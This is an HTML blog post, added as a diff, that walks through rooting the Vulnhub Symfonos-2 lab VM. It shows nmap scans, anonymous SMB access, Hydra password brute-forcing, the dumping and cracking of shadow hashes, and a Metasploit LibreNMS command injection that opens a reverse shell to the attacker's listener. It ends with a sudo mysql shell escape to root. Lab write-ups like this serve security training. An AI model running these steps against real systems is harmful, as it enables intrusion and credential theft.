@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
+    <style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                    <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+                Vulnhub: Symfonos-2
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Jan 2, 2021
+            </h2>
+        </div>
+    </div>
+</section>
+<section class="container mt-2">
+<div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">Symfonos-2</a></li>
+        </ul>
+      </nav>
+<h4>Scanning</h4>
+<p>Finding the box on the network:</p>
+<pre><code><span>crazyeights@es-base:~$ nmap -PS 192.168.56.1-255
+Nmap scan report for 192.168.56.133
+Host is up (0.00015s latency).
+Not shown: 995 closed ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+</span></code></pre>
+<p>Find specific details about running services (snipped):</p>
+<pre><code><span>crazyeights@es-base:~$ nmap -A -p- 192.168.56.133
+
+Not shown: 65530 closed ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         ProFTPD 1.3.5
+22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+80/tcp  open  http        WebFS httpd 1.21
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
+</span></code></pre>
+<ul>
+<li>Only real important detail -  domain name: <code>symfonos2</code></li>
+</ul>
+<h3>Web:</h3>
+<p>Index Page:</p>
+<img src="images/sym2.png">
+<ul>
+<li>Download image from index page for later</li>
+</ul>
+<p>Enumerating Server:</p>
+<pre><code><span>crazyeights@es-base:~$ dirb http://192.168.56.133
+</span></code></pre>
+<ul>
+<li>There is nothing else on the server.</li>
+<li>Moving on to check the shares.</li>
+</ul>
+<h3>SMB:</h3>
+<ul>
+<li>List null shares:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ smbclient -L \\symfonos2 -I 192.168.56.133 -N
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	anonymous       Disk      
+	IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
+SMB1 disabled -- no workgroup available
+</span></code></pre>
+<ul>
+<li>Connect to the available null share anonymous:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ smbclient \\\\symfonos2\\anonymous -I 192.168.56.133 -N
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Thu Jul 18 10:30:09 2019
+  ..                                  D        0  Thu Jul 18 10:29:08 2019
+  backups                             D        0  Thu Jul 18 10:25:17 2019
+
+		19728000 blocks of size 1024. 16312448 blocks available
+smb: \&gt; cd backups
+</span></code></pre>
+<ul>
+<li>Download the file log.txt:</li>
+</ul>
+<pre><code><span>smb: \backups\&gt; ls
+  .                                   D        0  Thu Jul 18 10:25:17 2019
+  ..                                  D        0  Thu Jul 18 10:30:09 2019
+  log.txt                             N    11394  Thu Jul 18 10:25:16 2019
+
+		19728000 blocks of size 1024. 16312448 blocks available
+smb: \backups\&gt; get log.txt 
+getting file \backups\log.txt of size 11394 as log.txt (741.8 KiloBytes/sec) (average 741.8 KiloBytes/sec)
+smb: \backups\&gt; 
+</span></code></pre>
+<ul>
+<li>In log.txt we find a user:</li>
+</ul>
+<pre><code><span># Set the user and group under which the server will run.
+User				aeolus
+Group				aeolus
+</span></code></pre>
+<ul>
+<li>Try to get the users credentials</li>
+<li>Thought there was something on FTP, so tried to get the user's password for FTP:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ hydra -l aeolus -P lists/rockyou.txt ftp://192.168.56.133
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://192.168.56.133:21/
+[21][ftp] host: 192.168.56.133   login: aeolus   password: sergioteamo
+1 of 1 target successfully completed, 1 valid password found
+
+crazyeights@es-base:~$ 
+</span></code></pre>
+<ul>
+<li>Nothing extra in ftp</li>
+<li>The found password is the users password for SSH as well</li>
+</ul>
+<h3>User:</h3>
+<ul>
+<li>Login as aeolus:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ ssh aeolus@192.168.56.133
+</span></code></pre>
+<ul>
+<li>The user has nothing interesting in their home folder:</li>
+</ul>
+<pre><code><span>aeolus@symfonos2:~$ ls
+share
+aeolus@symfonos2:~$ 
+</span></code></pre>
+<ul>
+<li>In the log.txt file found earlier there is the following line, if we can find it we can crack user passswords:</li>
+</ul>
+<pre><code><span>root@symfonos2:~# cat /etc/shadow &gt; /var/backups/shadow.bak
+</span></code></pre>
+<ul>
+<li>Getting shadow.bak from backups:</li>
+</ul>
+<pre><code><span>aeolus@symfonos2:/var$ cd backups/
+
+aeolus@symfonos2:/var/backups$ cat shadow.bak 
+root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7:::
+[SNIP]
+aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::
+cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::
+mysql:!:18095:0:99999:7:::
+Debian-snmp:!:18095:0:99999:7:::
+librenms:!:18095::::::
+</span></code></pre>
+<ul>
+<li>Tried to crack the passwords for the users cronus and root, was unsuccessful:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ john --wordlist=lists/rockyou.txt --rules sym2_pass 
+</span></code></pre>
+<ul>
+<li>Noticed this line:</li>
+</ul>
+<pre><code><span>librenms:!:18095::::::
+</span></code></pre>
+<ul>
+<li>librenms is a netwoork monitoring system - there might be another webservice running</li>
+<li>Searched for librenms files:</li>
+</ul>
+<pre><code><span>aeolus@symfonos2:~$ find / -name &quot;*librenms*&quot; 2&gt;/dev/null
+/var/lib/apache2/site/enabled_by_admin/librenms
+/var/lib/mysql/librenms
+/opt/librenms
+/etc/logrotate.d/librenms
+/etc/apache2/sites-available/librenms.conf
+/etc/apache2/sites-enabled/librenms.conf
+</span></code></pre>
+<ul>
+<li>Didn't have permissions to access most of them, found this file:</li>
+</ul>
+<pre><code><span>aeolus@symfonos2:~$ cat /etc/apache2/sites-available/librenms.conf 
+&lt;VirtualHost 127.0.0.1:8080&gt;
+  DocumentRoot /opt/librenms/html/
+  ServerName  localhost
+
+  AllowEncodedSlashes NoDecode
+  &lt;Directory &quot;/opt/librenms/html/&quot;&gt;
+    Require all granted
+    AllowOverride All
+    Options FollowSymLinks MultiViews
+  &lt;/Directory&gt;
+&lt;/VirtualHost&gt;
+</span></code></pre>
+<ul>
+<li>The service is only available locally we must use SSH tunneling to make it available on our machine:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ ssh -L 9999:localhost:8080 aeolus@192.168.56.133
+</span></code></pre>
+<h4>LibreNMS</h4>
+<img src="images/sym21.png">
+<ul>
+<li>LibreNMS has several vulnerabilities, the ones for metasploit seem promising:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ searchsploit librenms
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+LibreNMS - addhost Command Injection (Metaspl | linux/remote/46970.rb
+LibreNMS - Collectd Command Injection (Metasp | linux/remote/47375.rb
+LibreNMS 1.46 - 'addhost' Remote Code Executi | php/webapps/47044.py
+LibreNMS 1.46 - 'search' SQL Injection        | multiple/webapps/48453.txt
+---------------------------------------------- ---------------------------------
+</span></code></pre>
+<ul>
+<li>
+<p>The commnand injection exploit requires credentials, but we can login with aeolus's credentials (same as SSH):</p>
+<img src="images/sym22.png">
+</li>
+<li>
+<p>Trying the metasploit exploit addhost command injection:</p>
+</li>
+</ul>
+<pre><code><span>msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; options
+
+Module options (exploit/linux/http/librenms_addhost_cmd_inject):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   sergioteamo      yes       Password for LibreNMS
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT      9999             yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base LibreNMS path
+   USERNAME   aeolus           yes       User name for LibreNMS
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.56.1     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux
+</span></code></pre>
+<ul>
+<li>We must set LHOST to our address for the vbox interface, as the address must be accessible from the target</li>
+</ul>
+<pre><code><span>msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; exploit
+
+[*] Started reverse TCP double handler on 192.168.56.1:4444 
+[*] Successfully logged into LibreNMS. Storing credentials...
+[SNIP]
+[*] Command shell session 1 opened (192.168.56.1:4444 -&gt; 192.168.56.133:43528) at 2021-01-02 22:15:10 -0500
+
+id
+uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
+</span></code></pre>
+<ul>
+<li>We now have user cronus</li>
+</ul>
+<p>Spawning an interactive shell:</p>
+<pre><code><span>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</span></code></pre>
+<ul>
+<li>Check if cronus can run anything with elevated privileges:</li>
+</ul>
+<pre><code><span>cronus@symfonos2:/opt/librenms/html$ sudo -l 
+sudo -l
+Matching Defaults entries for cronus on symfonos2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User cronus may run the following commands on symfonos2:
+    (root) NOPASSWD: /usr/bin/mysql
+
+</span></code></pre>
+<ul>
+<li>We can use the execute parameter to get a shell:</li>
+</ul>
+<pre><code class="cronus@symfonos2:/opt/librenms/html$">sudo mysql -e '\! /bin/sh'
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre>
+<h5>Root Flag:</h5>
+<pre><code><span># cd /root
+cd /root
+# ls
+ls
+proof.txt
+# cat proof.txt	
+cat proof.txt
+
+	Congrats on rooting symfonos:2!
+[SNIP]
+</span></code></pre>
+<p>FIN. 🥳</p>
+</div>
+</section>
+<footer class="footer">
+    <div class="container">
+        <div class="columns">
+        </div>
+    </div>
+</footer>
+</body>
+</html>
